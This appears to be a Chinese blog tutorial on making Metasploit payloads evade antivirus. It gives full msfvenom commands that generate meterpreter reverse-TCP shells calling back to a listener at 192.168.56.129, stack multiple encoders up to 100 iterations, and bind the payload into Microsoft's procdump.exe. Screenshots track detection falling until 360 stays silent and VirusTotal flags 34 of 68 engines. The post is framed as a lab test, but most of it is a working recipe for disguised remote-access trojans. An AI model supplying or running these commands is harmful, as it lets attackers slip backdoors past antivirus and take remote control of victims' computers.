## ****0x01 环境搭建****

测试系统:windows10 (1909)

杀毒软件：360安全卫士

在线杀毒：VT

##  ** **0x02 payload生成****

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.129 LPORT=7777 -f
exe -o t.exe

![1599479473.png!small](https://image.3001.net/images/20200907/1599479473.png!small)

原始生成后，完全被查杀

![1599479482.png!small](https://image.3001.net/images/20200907/1599479482.png!small)

VT查杀55/69

![1599479492.png!small](https://image.3001.net/images/20200907/1599479492.png!small)

##  ** **0x03 编码处理****

这里使用msf自带的编码器进行测试

msfvenom --list encoders 查看当前所有编码器

![1599480026.png!small](https://image.3001.net/images/20200907/1599480026.png!small)

这里根据级别(Rank)选择最好的(excellent)进行尝试：x86/shikata_ga_nai

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.129 LPORT=7777 -e
x86/shikata_ga_nai -b "\x00" -i 20 -f exe -o t2.exe

其中-b 特征码绕过 -i 编码次数

![1599480050.png!small](https://image.3001.net/images/20200907/1599480050.png!small)

![1599480060.png!small](https://image.3001.net/images/20200907/1599480060.png!small)

依旧被查杀

##  ** **0x04 编码捆绑****

测试编码并绑定微软官方工具，这里使用官方procdump做实验

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.129 LPORT=7777 -e
x86/shikata_ga_nai -x procdump.exe -i 20 -f exe -o t3.exe

![1599480071.png!small](https://image.3001.net/images/20200907/1599480071.png!small)

360并未报毒，vt查杀率36/68

![1599480080.png!small](https://image.3001.net/images/20200907/1599480080.png!small)

##  ** **0x05多重编码****

通过资料了解，msfvenom某一种编码器可以做到一定程度的免杀，这是可以多重编码增大免杀率，同时x86/shikata_ga_nai为多态编码，可以尝试增大编码次数达到免杀效果

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e
x86/call4_dword_xor -i 100 LHOST=192.168.56.129 LPORT=7777 -f raw | msfvenom
-a x86 --platform windows -e x86/countdown -i 100 -f raw | msfvenom -a x86
--platform windows -e x86/shikata_ga_nai -b "&" -i 100 -f raw | msfvenom -a
x86 --platform windows -e cmd/powershell_base64 -i 100 -x procdump.exe -k -f
exe >t4.exe

这里测试编码次数100，同样绑定官方工具，360查杀并未报毒

![1599480090.png!small](https://image.3001.net/images/20200907/1599480090.png!small)

VT在线查杀率34/68

![1599480100.png!small](https://image.3001.net/images/20200907/1599480100.png!small)

测试可正常上线

![1599480111.png!small](https://image.3001.net/images/20200907/1599480111.png!small)

